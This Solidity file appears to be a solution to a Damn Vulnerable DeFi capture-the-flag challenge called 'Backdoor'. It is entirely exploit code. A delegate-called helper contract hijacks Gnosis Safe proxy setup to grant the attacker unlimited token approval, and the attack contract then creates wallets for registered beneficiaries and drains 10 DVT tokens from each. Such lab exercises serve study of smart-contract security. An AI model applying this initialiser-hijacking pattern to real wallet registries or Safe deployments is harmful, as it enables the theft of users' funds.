// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

// Contract to be delegate called during proxy initialization
// Call will approve attack contract to spend the wallets DVT
contract DelegateCallee {
    address public immutable attackContract;
    IERC20 public immutable token;

    constructor(address _tokenAddress) {
        attackContract = msg.sender;
        token = IERC20(_tokenAddress);
    }

    function approve() external {
        token.approve(attackContract, 2 ** 256 - 1);
    }
}

contract BackdoorAttack {
    WalletRegistry registry;
    GnosisSafeProxyFactory factory;
    address singleton;
    address[] owners;
    DelegateCallee public approver;

    uint256 constant THRESHOLD = 1;
    address constant FALLBACK_HANDLER = address(0);
    address immutable token;

    constructor(
        address _walletRegistryAddress,
        address _gnosisSafeProxyFactoryAddress,
        address _singleton,
        address[] memory _owners,
        address _paymentTokenAddress
    ) {
        registry = WalletRegistry(_walletRegistryAddress);
        factory = GnosisSafeProxyFactory(_gnosisSafeProxyFactoryAddress);
        singleton = _singleton;
        owners = _owners;
        approver = new DelegateCallee(_paymentTokenAddress);
        token = _paymentTokenAddress;
    }

    function attack() public {
        for (uint8 i = 0; i < owners.length; i++) {
            // create proxy wallet
            address[] memory owner = new address[](1);
            owner[0] = owners[i];
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                THRESHOLD,
                address(approver),
                abi.encodeWithSignature("approve()"),
                FALLBACK_HANDLER,
                0,
                0,
                address(0)
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                i,
                registry
            );

            // transfer 10 DVT from proxy to attacker
            IERC20(token).transferFrom(address(proxy), address(msg.sender), 10 ether);
        }
    }
}
